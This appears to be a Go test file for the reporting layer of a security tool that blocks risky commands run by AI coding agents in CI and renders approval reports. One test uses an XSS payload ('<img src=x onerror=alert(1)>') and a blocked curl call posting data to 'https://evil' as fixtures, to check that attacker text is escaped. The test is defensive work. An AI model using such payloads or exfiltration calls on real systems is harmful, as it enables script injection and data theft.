package report

import (
	"bytes"
	"strings"
	"testing"

	"github.com/ChelateSec/titra/internal/audit"
	"github.com/ChelateSec/titra/internal/jobctx"
)

func rec(tool, verdict, rule string) audit.Record {
	return audit.Record{Tool: tool, Args: []string{"push"}, Verdict: verdict, RuleID: rule, Severity: "critical", Mode: "enforce", Source: "claude-code", AgentTool: "Bash"}
}

func TestStatusFromRecords(t *testing.T) {
	cases := map[string][]audit.Record{
		"clean":   {rec("git", "allow", "")},
		"warning": {rec("git", "would-block", "r")},
		"blocked": {rec("git", "block", "r"), rec("git", "would-block", "r")},
	}
	for want, recs := range cases {
		if s := Build(Input{Records: recs}); s.Status != want {
			t.Errorf("want %s, got %s", want, s.Status)
		}
	}
}

func TestMarkdownTellsTheStoryAndOffersApproval(t *testing.T) {
	ctx := jobctx.Context{Repo: "acme/api", Event: "issues", Actor: "eve", Association: "NONE", TrustNote: "outside contributor", Number: "7", ApproveLabel: "titra:approve"}
	s := Build(Input{Records: []audit.Record{rec("git", "block", "block-git-push")}, Context: ctx})
	var b bytes.Buffer
	StoryMarkdown(&b, s)
	md := b.String()
	for _, want := range []string{"Titra blocked 1", "acme/api", "eve", "block-git-push", "`titra:approve` label to #7"} {
		if !strings.Contains(md, want) {
			t.Errorf("markdown missing %q:\n%s", want, md)
		}
	}
}

func TestApprovedRunSaysSoAndDoesNotOfferApproval(t *testing.T) {
	ctx := jobctx.Context{Repo: "acme/api", Number: "7", ApproveLabel: "titra:approve", ApprovedBy: "mo"}
	s := Build(Input{Records: []audit.Record{rec("git", "would-block", "r")}, Context: ctx})
	var b bytes.Buffer
	StoryMarkdown(&b, s)
	md := b.String()
	if !strings.Contains(md, "Approved") || !strings.Contains(md, "mo") || strings.Contains(md, "Is this expected?") {
		t.Fatalf("approved run rendering:\n%s", md)
	}
}

func TestMarkdownEscapesAttackerText(t *testing.T) {
	ctx := jobctx.Context{Repo: "acme/api", Subject: "issue #1: | evil | <img src=x onerror=alert(1)>"}
	r := rec("curl", "block", "r")
	r.Args = []string{"-d", "x|y", "https://evil"}
	s := Build(Input{Records: []audit.Record{r}, Context: ctx})
	var b bytes.Buffer
	StoryMarkdown(&b, s)
	for _, line := range strings.Split(b.String(), "\n") {
		if strings.HasPrefix(line, "| **Input**") && strings.Count(line, "|") != strings.Count(line, `\|`)+3 {
			t.Fatalf("attacker '|' should be escaped so it can't break the table: %q", line)
		}
	}
}
